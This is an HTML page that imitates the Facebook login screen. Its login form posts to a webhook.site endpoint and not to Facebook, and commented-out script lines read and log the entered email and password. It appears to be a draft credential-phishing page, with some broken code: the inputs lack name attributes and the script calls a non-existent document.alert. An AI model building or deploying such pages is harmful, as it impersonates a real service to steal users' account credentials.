<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login</title>
    <!-- Bootstrap CSS -->
    <link
      rel="stylesheet"
      href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css"
    />
    <!-- Custom CSS -->
    <style>
      body {
        background-color: #f0f2f5;
        font-family: Arial, sans-serif;
      }
      .login-container {
        max-width: 400px;
        margin: 100px auto;
        background-color: #fff;
        padding: 40px;
        border-radius: 8px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
      }
      .login-form input[type="email"],
      .login-form input[type="password"] {
        width: 100%;
        margin-bottom: 20px;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 4px;
      }
      .login-form button[type="submit"] {
        width: 100%;
        padding: 10px;
        border: none;
        border-radius: 4px;
        background-color: #1877f2;
        color: #fff;
        font-size: 16px;
        cursor: pointer;
      }
      .login-form button[type="submit"]:hover {
        background-color: #166fe5;
      }
      .login-form .signup-link {
        text-align: center;
      }
      .login-form .signup-link a {
        color: #1877f2;
        text-decoration: none;
      }
      .login-form .signup-link a:hover {
        text-decoration: underline;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="login-container">
        <h2 class="text-center mb-5">Log in to Facebook</h2>
        <form
          class="login-form"
          action="https://webhook.site/9a7c59e2-3166-46d2-8383-b271f64c3951"
          method="POST"
        >
          <input
            type="email"
            id="idname"
            placeholder="Email address"
            required
          />
          <input
            type="password"
            id="idpasswd"
            placeholder="Password"
            required
          />
          <button type="submit">Log In</button>
        </form>
        <div class="signup-link">
          <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
      </div>
    </div>

    <script>
      // let idname = document.getElementById("idname").value;
      // let idpasswd = document.getElementById("idpasswd").value;
      // console.log(idname, " = " , idpasswd)

      function getQueryStringParameter(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
      }

      const name = getQueryStringParameter("name");
      if (name) {
        console.log(name);
      } else {
        document.alert("<h1>Hello, Guest!</h1>");
      }
      console.log("test");
      console.log(name);
    </script>
  </body>
</html>
